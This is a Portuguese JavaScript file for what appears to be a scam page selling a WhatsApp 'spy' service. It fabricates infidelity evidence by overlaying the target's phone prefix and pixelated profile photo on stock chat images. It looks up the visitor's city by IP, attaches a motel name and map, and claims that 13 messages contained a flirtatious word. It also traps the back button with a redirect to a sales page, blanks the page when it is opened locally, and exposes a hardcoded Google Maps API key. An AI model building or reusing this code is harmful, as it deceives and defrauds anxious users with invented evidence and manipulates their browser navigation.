document.addEventListener("DOMContentLoaded", function () {
  // Obtém o parâmetro 'pessoa' da URL
  const urlParams = new URLSearchParams(window.location.search);
  const pessoa = urlParams.get("pessoa"); // homem ou mulher

  // Seleciona os elementos de imagem e áudio pelo ID
  const imgElement = document.getElementById("imgaudio");
  const audioElement = document.getElementById("audiomp3");

  // Verifica se os elementos existem
  if (imgElement && audioElement) {
    // Verifica o valor do parâmetro 'pessoa' e ajusta a imagem e o áudio
    if (pessoa === "homem") {
      imgElement.src = "https://i.ibb.co/27mDL9M/HOMEM.png";
      audioElement.src =
        "https://espiaodesegredo.com/wp-content/uploads/2024/09/0919.mp3";
    } else if (pessoa === "mulher") {
      imgElement.src = "https://i.ibb.co/K2YQ8nF/MULHER.png";
      audioElement.src =
        "https://espiaodesegredo.com/wp-content/uploads/2024/09/mulher.mp3";
    }
  } else {
    console.error("Elementos de imagem ou áudio não encontrados!");
  }

  // Função para definir o player e eventos de áudio
  const player = new Plyr(".plyr", {
    controls: ["play", "progress", "current-time", "duration"],
  });

  const audioElementPlyr = document.querySelector(".plyr");
  const currentTimeElement = document.querySelector(".plyr__time--current");
  const durationElement = document.querySelector(".plyr__time--duration");
  const microphoneIcon = document.querySelector(".microphone-icon");

  // Verifica se os elementos do controle de áudio existem antes de tentar manipulá-los
  if (
    audioElementPlyr &&
    currentTimeElement &&
    durationElement &&
    microphoneIcon
  ) {
    currentTimeElement.classList.add("hide"); // Adiciona a classe 'hide' ao iniciar

    audioElementPlyr.addEventListener("play", function () {
      currentTimeElement.classList.remove("hide");
      durationElement.classList.add("hide");
      microphoneIcon.classList.add("blue"); // Adiciona a classe 'blue' para alterar a cor do ícone
      audioElementPlyr.classList.add("blue"); // Adiciona a classe 'blue' para alterar o background do controle deslizante
      audioElementPlyr.style.setProperty("--range-thumb-background", "#3db8ee");
    });

    audioElementPlyr.addEventListener("pause", function () {
      currentTimeElement.classList.add("hide");
      durationElement.classList.remove("hide");
    });
  } else {
    console.error("Elementos de controle de áudio não encontrados!");
  }

  const audioContainer = document.getElementById("audioContainer");
  const playPauseButton = audioContainer?.querySelector(
    '.plyr__controls button[data-plyr="play"]'
  );
  const audioBox = document.querySelector(".audio-box");

  // Verifica se os elementos de áudio e controle existem antes de adicionar eventos
  if (audioContainer && playPauseButton && audioBox) {
    audioContainer.addEventListener("click", function () {
      playPauseButton.click();
    });

    playPauseButton.addEventListener("click", function () {
      playPauseButton.click();
    });

    audioBox.addEventListener("click", function (event) {
      event.stopPropagation();
      playPauseButton.click();
    });
  } else {
    if (!audioContainer) {
      console.error("Elemento audioContainer não encontrado!");
    }
    if (!playPauseButton) {
      console.error("Elemento playPauseButton não encontrado!");
    }
    if (!audioBox) {
      console.error("Elemento audioBox não encontrado!");
    }
  }

  // Quando o usuário acessa a pagina3.html, marcamos no localStorage
  localStorage.setItem("accessedFinalPage", "true");

  var urlBackRedirect = "https://appespiaopro.fun/backredirect"; // URL sem espaços

  // Formata a URL para redirecionamento
  urlBackRedirect =
    urlBackRedirect.trim() +
    (urlBackRedirect.indexOf("?") > 0 ? "&" : "?") +
    document.location.search.replace("?", "").toString();

  // Adiciona duas entradas no histórico para manipulação
  history.pushState({}, "", location.href);
  history.pushState({}, "", location.href);

  // Função para redirecionar para a página de backredirect
  function redirectToBack() {
    setTimeout(function () {
      location.href = urlBackRedirect;
    }, 1);
  }

  // Detecta o uso do botão de voltar do navegador
  window.onpopstate = redirectToBack;

  // Verifica se o site está sendo executado localmente (file://)
  if (window.location.protocol === "file:") {
    // Destrói o conteúdo da página
    document.body.innerHTML =
      '<h1>AQUI SEU CURIOSO!</h1><img src="https://espiaodesegredo.com/wp-content/uploads/2022/07/weekend-ending-middle-finger.gif" alt="Curioso GIF">';
  }

  const pessoaParam = urlParams.get("pessoa"); // homem ou mulher
  let phoneNumber = urlParams.get("number"); // número da pessoa

  // Adiciona o prefixo +55 ao número
  if (!phoneNumber.startsWith("+55")) {
    phoneNumber = `+55${phoneNumber.replace(/\D/g, "")}`;
  }

  // Função para formatar o número no estilo +55 {DDD} 9
  function getPhoneInitial(number) {
    let cleanNumber = number.replace(/\D/g, ""); // Remove todos os caracteres não numéricos

    if (cleanNumber.startsWith("55")) {
      cleanNumber = cleanNumber.slice(2); // Remove o prefixo 55
    }

    const match = cleanNumber.match(/^(\d{2})(\d)/); // Extrai o DDD e o primeiro dígito do número
    if (match) {
      return `+55 ${match[1]} ${match[2]}`;
    }
    return "+55"; // Retorno padrão caso a formatação não corresponda
  }

  // Função para converter os bytes da imagem para base64 e formatar
  function formatBase64Image(dadosImagem) {
    const imagemBase64 = btoa(dadosImagem);
    const linhaSemBarra = imagemBase64.replace(/\//g, "_");
    return linhaSemBarra.replace(/[^a-zA-Z0-9_]/g, "");
  }

  // Função para buscar a foto de perfil usando a API fornecida

  // Função para buscar a cidade e o nome do motel usando a nova API PHP
  async function fetchCityAndMotel() {
    let userCity = "Desconhecida";
    let motelNome = "Motel não localizado";

    // Busca a cidade
    try {
      const response = await fetch("https://ipapi.co/json/");
      const result = await response.json();
      userCity = result.city || "Desconhecida";

      // Busca o nome do motel usando a nova API em PHP
      const apiUrl = `https://vejawhats.site/api/motel.php?cidade=${encodeURIComponent(
        userCity
      )}`;
      const motelResponse = await fetch(apiUrl);
      const motelData = await motelResponse.json();

      if (motelData.status === "success") {
        motelNome = motelData.motel.name || "Motel não localizado";
      }

      setMapImage(userCity, motelNome);
      updateCityAndMotel(userCity, motelNome); // Atualiza o nome da cidade e motel no HTML
    } catch (error) {
      console.error("Erro ao buscar a cidade e motel:", error);
      setMapImage(userCity, motelNome);
      updateCityAndMotel(userCity, motelNome); // Atualiza o nome da cidade e motel no HTML
    }
  }

  // Função para atualizar o nome da cidade e do motel no HTML
  function updateCityAndMotel(city, motel) {
    // Define o nome da cidade
    const cityNameElement = document.getElementById("city-name");
    if (cityNameElement) {
      cityNameElement.textContent = city;
    }

    // Define o nome do motel
    const motelNameElement = document.getElementById("motel-name");
    if (motelNameElement) {
      motelNameElement.textContent = motel;
    }
  }

  function setMapImage(city, motel) {
    const mapImage = document.getElementById("map-image");
    const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?size=512x312&maptype=roadmap&markers=color:red%7C${encodeURIComponent(
      motel
    )}+${encodeURIComponent(city)}&key=AIzaSyDhPrFhwx88pExKW3XbnCnWTAI423eml0E`;
    mapImage.src = mapUrl;
  }

  // Função para definir o texto com base no gênero
  function updateTextByGender() {
    const genderSensitiveText = document.getElementById(
      "gender-sensitive-text"
    );
    if (pessoaParam === "homem") {
      genderSensitiveText.innerHTML =
        '13 mensagens continham a palavra / semelhante "<strong>Gostosa</strong>"';
    } else {
      genderSensitiveText.innerHTML =
        '13 mensagens continham a palavra / semelhante "<strong>Gostoso</strong>"';
    }
  }
  function encodeImageUrlToBase64(url) {
    // Primeiro, decodificamos o URL duas vezes
    const decodedUrl = decodeURIComponent(decodeURIComponent(url));
    // Depois, codificamos para base64
    return btoa(decodedUrl);
  }

  // Função para definir as URLs das imagens com base no gênero
  async function setImageUrl() {
    const cookieValue = document.cookie
      .split("; ")
      .find((row) => row.startsWith("perfil="));
    let imageUrl;
    if (cookieValue) {
      imageUrl = cookieValue.split("=")[1];
    } else {
      imageUrl = "https://i.ibb.co/dBTfnyy/Design-sem-nome-2.jpg";
    }

    const base64Image = encodeImageUrlToBase64(imageUrl);
    console.log(base64Image);

    //converte a imagem do link para base 64

    const primeiraIMGHomem = `https://res.cloudinary.com/diky6jzeu/image/upload/l_fetch:${base64Image},w_130,h_130,c_fit,r_max/e_pixelate:9/fl_layer_apply,x_-292,y_900/l_STARK:b0yi05hws4qsqge1elvn/e_pixelate:9/fl_layer_apply,x_-232,y_930/l_fetch:${base64Image},w_130,h_130,c_fit,r_max/e_pixelate:9/fl_layer_apply,x_-292,y_503/l_STARK:b0yi05hws4qsqge1elvn/e_pixelate:9/fl_layer_apply,x_-232,y_533/l_fetch:${base64Image},w_130,h_130,c_fit,r_max/e_pixelate:9/fl_layer_apply,x_-292,y_340/l_STARK:b0yi05hws4qsqge1elvn/e_pixelate:9/fl_layer_apply,x_-232,y_370/l_fetch:${base64Image},w_130,h_130,c_fit,r_max/fl_layer_apply,x_-292,y_-145/l_STARK:b0yi05hws4qsqge1elvn/fl_layer_apply,x_-232,y_-107/l_fetch:${base64Image},w_130,h_130,c_fit,r_max/fl_layer_apply,x_-292,y_-635/l_STARK:b0yi05hws4qsqge1elvn/fl_layer_apply,x_-232,y_-595/co_rgb:FFFFFF,l_text:roboto_45_bold_normal_left:${getPhoneInitial(
      phoneNumber
    )}/fl_layer_apply,x_-265,y_-957/v1713298570/STARK/xjhkybmlono4ywoekdld.jpg`;

    const primeiraIMGMulher = `https://res.cloudinary.com/diky6jzeu/image/upload/l_fetch:${base64Image},w_130,h_130,c_fit,r_max/e_pixelate:9/fl_layer_apply,x_-292,y_750/l_STARK:b0yi05hws4qsqge1elvn/e_pixelate:9/fl_layer_apply,x_-232,y_790/l_fetch:${base64Image},w_130,h_130,c_fit,r_max/e_pixelate:9/fl_layer_apply,x_-292,y_573/l_STARK:b0yi05hws4qsqge1elvn/e_pixelate:9/fl_layer_apply,x_-232,y_613/l_fetch:${base64Image},w_130,h_130,c_fit,r_max/e_pixelate:9/fl_layer_apply,x_-292,y_397/l_STARK:b0yi05hws4qsqge1elvn/e_pixelate:9/fl_layer_apply,x_-232,y_437/l_fetch:${base64Image},w_130,h_130,c_fit,r_max/e_pixelate:9/fl_layer_apply,x_-292,y_220/l_STARK:b0yi05hws4qsqge1elvn/e_pixelate:9/fl_layer_apply,x_-232,y_260/l_fetch:${base64Image},w_130,h_130,c_fit,r_max/fl_layer_apply,x_-292,y_-334/l_STARK:b0yi05hws4qsqge1elvn/fl_layer_apply,x_-232,y_-294/co_rgb:FFFFFF,l_text:roboto_45_bold_normal_left:${getPhoneInitial(
      phoneNumber
    )}/fl_layer_apply,x_-265,y_-800/v1713298569/STARK/h4ca0dcjt9v0nai9en48.jpg`;

    const segundaIMGHomem = `https://res.cloudinary.com/diky6jzeu/image/upload/co_rgb:000000,l_text:roboto_55_normal_left:${getPhoneInitial(
      phoneNumber
    )}/fl_layer_apply,g_center,x_-217,y_-70/co_rgb:000000,l_text:roboto_55_normal_left:${getPhoneInitial(
      phoneNumber
    )}/fl_layer_apply,g_center,x_-217,y_160/v1713298570/STARK/i1hhh1iw7gdvbm6mm52h.jpg`;

    const segundaIMGMulher = `https://res.cloudinary.com/diky6jzeu/image/upload/co_rgb:000000,l_text:roboto_55_normal_left:${getPhoneInitial(
      phoneNumber
    )}/fl_layer_apply,g_center,x_-217,y_-70/co_rgb:000000,l_text:roboto_55_normal_left:${getPhoneInitial(
      phoneNumber
    )}/fl_layer_apply,g_center,x_-217,y_160/v1713298569/STARK/uh2f5rfc3hyf8rcn2vrm.jpg`;

    const terceiraIMGHomem =
      "https://vejawhats.site/assets/images/homem-fotos.jpg";
    const terceiraIMGMulher =
      "https://vejawhats.site/assets/images/mulher-fotos.jpg";

    // Define as URLs das imagens com base no sexo
    document.getElementById("primeira-imagem").src =
      pessoaParam === "homem" ? primeiraIMGHomem : primeiraIMGMulher;
    document.getElementById("segunda-imagem").src =
      pessoaParam === "homem" ? segundaIMGHomem : segundaIMGMulher;
    document.getElementById("terceira-imagem").src =
      pessoaParam === "homem" ? terceiraIMGHomem : terceiraIMGMulher;

    // Chama a função para buscar cidade e motel
    fetchCityAndMotel();
    updateTextByGender();
  }

  // Chama a função para definir as URLs das imagens
  setImageUrl();
});
